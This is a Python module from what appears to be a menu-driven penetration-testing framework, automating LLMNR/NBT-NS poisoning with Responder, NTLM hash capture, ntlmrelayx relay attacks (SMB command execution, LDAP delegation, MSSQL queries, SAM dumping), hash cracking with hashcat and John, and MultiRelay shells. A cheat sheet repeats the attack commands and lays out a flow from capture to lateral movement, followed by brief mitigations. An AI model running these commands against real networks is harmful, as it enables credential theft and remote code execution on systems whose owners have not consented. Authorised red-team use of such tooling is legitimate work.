"""Responder Suite Module - LLMNR/NBT-NS poisoning, NTLM hash capture, and relay attacks."""

import sys
import os

sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), ".."))

from ui import (console, show_stage_header, show_menu, ask, info, success,
                warning, error, confirm, show_results_panel, show_knowledge)
from executor import run_with_preview, run_command

STAGE = "responder"


def _responder_analyze(session):
    """Run Responder in analyze mode (passive, no poisoning)."""
    iface = ask("Enter network interface")
    if not iface:
        error("Interface required.")
        return

    info("Analyze mode — listens for LLMNR/NBT-NS/mDNS without poisoning.")
    cmd = f"responder -I {iface} -A"
    run_with_preview(cmd, session, STAGE)


def _responder_poison(session):
    """Run Responder in poisoning mode to capture NTLM hashes."""
    iface = ask("Enter network interface")
    if not iface:
        error("Interface required.")
        return

    warning("[!] This will actively poison LLMNR/NBT-NS responses on the network.")
    if not confirm("Start Responder poisoning?"):
        return

    options = [
        ("1", "[bold]Standard[/bold]        - LLMNR + NBT-NS + mDNS"),
        ("2", "[bold]With WPAD[/bold]       - Include WPAD poisoning"),
        ("3", "[bold]Aggressive[/bold]      - All protocols + force auth"),
        ("4", "[bold]Custom flags[/bold]    - Choose options"),
    ]
    choice = show_menu(options)

    if choice == "1":
        cmd = f"responder -I {iface} -v"
    elif choice == "2":
        cmd = f"responder -I {iface} -wFv"
    elif choice == "3":
        cmd = f"responder -I {iface} -wFbv"
    elif choice == "4":
        flags = ask("Enter Responder flags (e.g., -wFb)")
        cmd = f"responder -I {iface} {flags} -v"
    else:
        return

    info("Captured hashes will be saved to /opt/Responder/logs/ or /usr/share/responder/logs/")
    run_with_preview(cmd, session, STAGE)


def _ntlmrelayx(session):
    """NTLM relay attacks using ntlmrelayx (impacket)."""
    warning("[!] NTLM relay forwards captured auth to other services.")

    options = [
        ("1", "[bold]Relay to SMB[/bold]    - Execute command on target"),
        ("2", "[bold]Relay to LDAP[/bold]   - Dump AD info / create user"),
        ("3", "[bold]Relay to MSSQL[/bold]  - Execute SQL queries"),
        ("4", "[bold]SOCKSify[/bold]        - Create SOCKS proxy from relay"),
        ("5", "[bold]Dump SAM[/bold]        - Relay and dump SAM hashes"),
    ]
    choice = show_menu(options)

    targets_file = ask("Enter targets file path (or single IP)")

    if choice == "1":
        command = ask("Command to execute on target", default="whoami")
        cmd = f"ntlmrelayx.py -tf {targets_file} -smb2support -c '{command}'"
    elif choice == "2":
        cmd = f"ntlmrelayx.py -tf {targets_file} -smb2support --delegate-access"
    elif choice == "3":
        query = ask("SQL query to execute", default="SELECT @@version")
        cmd = f"ntlmrelayx.py -tf {targets_file} -smb2support --mssql -q '{query}'"
    elif choice == "4":
        cmd = f"ntlmrelayx.py -tf {targets_file} -smb2support -socks"
        info("After relay, use proxychains with socks://127.0.0.1:1080")
    elif choice == "5":
        cmd = f"ntlmrelayx.py -tf {targets_file} -smb2support --dump-sam"
    else:
        return

    run_with_preview(cmd, session, STAGE)


def _view_hashes(session):
    """View captured NTLM hashes from Responder logs."""
    log_dirs = [
        "/opt/Responder/logs",
        "/usr/share/responder/logs",
        "/usr/lib/python3/dist-packages/responder/logs",
        os.path.expanduser("~/Responder/logs"),
    ]

    found = None
    for d in log_dirs:
        if os.path.isdir(d):
            found = d
            break

    if found:
        info(f"Responder logs found at: {found}")
        run_with_preview(f"ls -la {found}/", session, STAGE)
        if confirm("View NTLMv2 hashes?"):
            run_with_preview(f"cat {found}/*NTLMv2* 2>/dev/null || echo 'No NTLMv2 hashes found'", session, STAGE)
        if confirm("View NTLMv1 hashes?"):
            run_with_preview(f"cat {found}/*NTLMv1* 2>/dev/null || echo 'No NTLMv1 hashes found'", session, STAGE)
    else:
        warning("No Responder log directory found.")
        custom = ask("Enter custom Responder log path")
        if custom:
            run_with_preview(f"ls -la {custom}/", session, STAGE)


def _crack_hashes(session):
    """Crack captured NTLM hashes."""
    hashfile = ask("Enter hash file path (from Responder logs)")
    if not hashfile:
        error("Hash file required.")
        return

    options = [
        ("1", "[bold]hashcat NTLMv2[/bold]  - GPU cracking"),
        ("2", "[bold]hashcat NTLMv1[/bold]  - GPU cracking"),
        ("3", "[bold]John NTLMv2[/bold]     - CPU cracking"),
        ("4", "[bold]John NTLMv1[/bold]     - CPU cracking"),
    ]
    choice = show_menu(options)

    wordlist = ask("Wordlist path", default="/usr/share/wordlists/rockyou.txt")

    cmds = {
        "1": f"hashcat -m 5600 {hashfile} {wordlist} --force",
        "2": f"hashcat -m 5500 {hashfile} {wordlist} --force",
        "3": f"john --format=netntlmv2 --wordlist={wordlist} {hashfile}",
        "4": f"john --format=netntlm --wordlist={wordlist} {hashfile}",
    }
    if choice in cmds:
        run_with_preview(cmds[choice], session, STAGE)


def _multirelay(session):
    """MultiRelay for automatic relay + shell."""
    target = ask("Enter target IP for relay")
    if not target:
        error("Target required.")
        return

    info("MultiRelay: auto-relay captured auth and spawn shell.")
    cmd = f"python3 MultiRelay.py -t {target} -u ALL"
    run_with_preview(cmd, session, STAGE)


def _cheat_sheet():
    """Responder & NTLM relay cheat sheet."""
    content = """# Responder & NTLM Relay Cheat Sheet

## Responder
```
# Analyze mode (passive)
responder -I eth0 -A

# Poison mode
responder -I eth0 -wFbv

# Hash locations
/opt/Responder/logs/
/usr/share/responder/logs/
```

## NTLM Relay (impacket)
```
# Relay to SMB (exec command)
ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"

# Relay to LDAP (AD access)
ntlmrelayx.py -tf targets.txt -smb2support --delegate-access

# Dump SAM via relay
ntlmrelayx.py -tf targets.txt -smb2support --dump-sam

# SOCKS proxy relay
ntlmrelayx.py -tf targets.txt -smb2support -socks
```

## Cracking NTLM Hashes
```
# NTLMv2 (hashcat mode 5600)
hashcat -m 5600 hashes.txt rockyou.txt

# NTLMv1 (hashcat mode 5500)
hashcat -m 5500 hashes.txt rockyou.txt

# John
john --format=netntlmv2 --wordlist=rockyou.txt hashes.txt
```

## Attack Flow
1. Run Responder to capture hashes
2. Crack hashes OR relay them
3. Relay → code execution on other hosts
4. Use obtained creds for lateral movement

## Mitigations
- Disable LLMNR: Group Policy → DNS Client → Turn Off Multicast
- Disable NBT-NS: Network adapter → TCP/IP → Advanced → WINS
- Require SMB signing: Group Policy → Always sign
- Enable EPA (Extended Protection for Authentication)
"""
    show_knowledge(content)


def run(session):
    """Responder Suite module entry point."""
    show_stage_header("Responder Suite", "LLMNR/NBT-NS poisoning, NTLM capture & relay attacks")

    while True:
        options = [
            ("1", "[bold]Responder Analyze[/bold] - Passive listening"),
            ("2", "[bold]Responder Poison[/bold]  - Active LLMNR/NBT-NS poison"),
            ("3", "[bold]NTLM Relay[/bold]        - ntlmrelayx attacks"),
            ("4", "[bold]View Hashes[/bold]       - Check captured hashes"),
            ("5", "[bold]Crack Hashes[/bold]      - hashcat/john cracking"),
            ("6", "[bold]MultiRelay[/bold]        - Auto-relay + shell"),
            ("7", "[bold]Cheat Sheet[/bold]       - Responder reference"),
            ("0", "[bold]Back to Main Menu[/bold]"),
        ]
        choice = show_menu(options)

        if choice == "0":
            return
        elif choice == "1":
            _responder_analyze(session)
        elif choice == "2":
            _responder_poison(session)
        elif choice == "3":
            _ntlmrelayx(session)
        elif choice == "4":
            _view_hashes(session)
        elif choice == "5":
            _crack_hashes(session)
        elif choice == "6":
            _multirelay(session)
        elif choice == "7":
            _cheat_sheet()
